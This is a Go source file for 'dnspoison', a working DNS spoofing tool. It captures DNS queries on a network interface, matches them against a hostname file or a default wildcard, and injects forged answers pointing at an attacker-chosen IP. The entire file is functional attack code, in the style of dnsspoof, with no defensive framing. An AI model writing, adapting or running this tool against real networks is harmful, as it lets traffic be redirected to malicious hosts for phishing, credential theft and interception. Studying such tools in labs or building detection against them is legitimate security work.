package main

import (
    "fmt"
    "flag"
    "io/ioutil"
    "strings"
    "net"
    "github.com/google/gopacket/pcap"
    "github.com/google/gopacket/layers"
    "github.com/google/gopacket"
    "log"
    "strconv"
    "regexp"
)

func checkForMatch(hostnameMap map[string]net.IP, queried_domain string) (bool, net.IP) {
    for domain, ip := range hostnameMap {
        domain_pattern := strings.ReplaceAll(domain, "*", ".*")
        match, _ := regexp.MatchString(domain_pattern, queried_domain)
        if match {
            return true, ip
        }
    }
    return false, nil
}

func sendSpoofedPacket(handle *pcap.Handle, eth *layers.Ethernet, ip *layers.IPv4, udp *layers.UDP, dns *layers.DNS, ip_address net.IP) {

    // Initialize all 4 layers of packet with spoofed data

    respEthernetLayer := layers.Ethernet{
        SrcMAC: eth.DstMAC,
        DstMAC: eth.SrcMAC,
        EthernetType: layers.EthernetTypeIPv4,
    }

    respIpv4Layer := layers.IPv4{
        Version: 4,
        TTL: 64,
        Protocol: layers.IPProtocolUDP,
        SrcIP: ip.DstIP,
        DstIP: ip.SrcIP,
    }

    respUdpLayer := layers.UDP{
        SrcPort: udp.DstPort,
        DstPort: udp.SrcPort,
    }
    respUdpLayer.SetNetworkLayerForChecksum(&respIpv4Layer)

    answers := make([]layers.DNSResourceRecord, 1)
    answer := layers.DNSResourceRecord{
        Name: dns.Questions[0].Name,
        Type: layers.DNSTypeA,
        Class: layers.DNSClassIN,
        TTL: 60,
        DataLength: uint16(len(ip_address.To4())),
        Data: ip_address.To4(),
        IP: ip_address.To4(),
    }
    answers[0] = answer
    respDnsLayer := layers.DNS{
        ID: dns.ID,
        QR: true,
        OpCode: layers.DNSOpCodeQuery,
        AA: false,
        TC: false,
        RD: true,
        RA: true,
        ResponseCode: layers.DNSResponseCodeNoErr,
        QDCount: 1,
        ANCount: 1,
        NSCount: 0,
        ARCount: 0,
        Questions: dns.Questions,
        Answers: answers,
    }

    options := gopacket.SerializeOptions{
        ComputeChecksums: true,
        FixLengths: true,
    }
    buffer := gopacket.NewSerializeBuffer()

    err := gopacket.SerializeLayers(buffer, options,
        &respEthernetLayer,
        &respIpv4Layer,
        &respUdpLayer,
        &respDnsLayer,
    )
    check(err)

    err = handle.WritePacketData(buffer.Bytes())
    check(err)
}

func handlePacket(handle *pcap.Handle, packet gopacket.Packet, hostnameMap map[string]net.IP) {

    // First, decode the DNS Layer
    dnsLayer := packet.Layer(layers.LayerTypeDNS)
    if dnsLayer == nil {
        log.Println("Error parsing DNS layer from packet")
        return
    }
    dns, _ := dnsLayer.(*layers.DNS)

    if !dns.QR {     // This is a dns query

        var queriedHostname = string(dns.Questions[0].Name) // Assuming only one question is present in the query

        // Check whether the response needs to be spoofed or not
        if performSpoof, spoofedIP := checkForMatch(hostnameMap, queriedHostname); performSpoof {

            // Decode the Ethernet Layer
            ethernetLayer := packet.Layer(layers.LayerTypeEthernet)
            if ethernetLayer == nil {
                log.Println("Error parsing Ethernet layer from packet")
                return
            }
            eth, _ := ethernetLayer.(*layers.Ethernet)

            // Decode the IPv4 Layer
            ipv4Layer := packet.Layer(layers.LayerTypeIPv4)
            if ipv4Layer == nil {
                log.Println("Error parsing ipv4 layer from packet")
                return
            }
            ip, _ := ipv4Layer.(*layers.IPv4)

            // Decode the UDP Layer
            udpLayer := packet.Layer(layers.LayerTypeUDP)
            if udpLayer == nil {
                log.Println("Error parsing UDP layer from packet")
            }
            udp, _ := udpLayer.(*layers.UDP)

            // Create and send a spoofed DNS Response packet on the handle
            sendSpoofedPacket(handle, eth, ip, udp, dns, spoofedIP)

            // Build a string with packet info to be logged
            var sb strings.Builder
            sb.WriteString(ip.SrcIP.String())
            sb.WriteString(":")
            sb.WriteString(strconv.FormatUint(uint64(udp.SrcPort), 10))
            sb.WriteString(" > ")
            sb.WriteString(ip.DstIP.String())
            sb.WriteString(":")
            sb.WriteString(strconv.FormatUint(uint64(udp.DstPort), 10))
            sb.WriteString(": ")
            sb.WriteString(strconv.FormatUint(uint64(dns.ID), 10))
            sb.WriteString("+ ")
            sb.WriteString(dns.Questions[0].Type.String())
            sb.WriteString("? ")
            sb.WriteString(queriedHostname)
            sb.WriteString("\n")

            // Log the info of dns request packet for which we spoofed the response
            fmt.Printf("%s", sb.String())
        }
    }

    // Check for errors
    if err := packet.ErrorLayer(); err != nil {
        log.Println("Error decoding some part of the packet:", err)
    }
}

func handlePacketSource(handle *pcap.Handle, hostnameMap map[string]net.IP, bpfFilter string) {
    var err = handle.SetBPFFilter(bpfFilter)
    check(err)

    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
    for packet := range packetSource.Packets() {
        handlePacket(handle, packet, hostnameMap)
    }
}

func listenForDnsReq(intf string, hostnameMap map[string]net.IP, bpfFilter string) {
    fmt.Println("dnspoison: Listening on", intf, "[", bpfFilter, "]")

    if handle, err := pcap.OpenLive(intf, 65536, true, pcap.BlockForever); err != nil {
        log.Fatal(err)
    } else {
        defer handle.Close()
        handlePacketSource(handle, hostnameMap, bpfFilter)
    }
}

func check(e error) {
    if e != nil {
        log.Fatal(e)
    }
}

func main() {

    intfPtr := flag.String("i", "", "network device interface")
    hostnameFile := flag.String("f", "", "hostnames file")

    flag.Parse()

    networkIntfName := ""
    var networkIntfIP net.IP
    if *intfPtr != "" {
        networkIntfName = *intfPtr
        intf, err := net.InterfaceByName(*intfPtr)
        check(err)
        addrs, err := intf.Addrs()
        check(err)
        for _, addr := range addrs {
            if networkIntfIP = addr.(*net.IPNet).IP.To4(); networkIntfIP != nil {
                break
            }
        }
    } else {
        fmt.Println("No inteface or file specified, will use the default network interface")
        devices, err := pcap.FindAllDevs()
        check(err)

        networkIntfName = devices[0].Name
        for _, addr := range devices[0].Addresses {
            if networkIntfIP = addr.IP.To4(); networkIntfIP != nil {
                break
            }
        }
    }

    // Creating a map to store all of the hostname mappings
    // Assuming if the hostname file contains www in the domain name, then the attack will only work
    // if the dns query is performed with www in the question (same as dnsspoof's behavior)
    hostnameMap := make(map[string]net.IP)
    if *hostnameFile != "" {
        data, err := ioutil.ReadFile(*hostnameFile)
        check(err)

        entries := strings.Split(string(data), "\n")
        for i := 0; i < len(entries); i++ {
            entry := strings.Split(strings.TrimSpace(entries[i]), " ")
            if len(entry) >= 2 {
                hostnameMap[entry[len(entry) - 1]] = net.ParseIP(entry[0])
            }
        }
    } else {
        hostnameMap["*"] = networkIntfIP
    }

    var bpfFilterStr string = "udp port 53 and not src " + networkIntfIP.String()
    if bpfArgs := flag.Args(); len(bpfArgs) != 0 {
        bpfFilterStr = bpfFilterStr + " and " + strings.Join(bpfArgs, " ")
    }

    listenForDnsReq(networkIntfName, hostnameMap, bpfFilterStr)
}
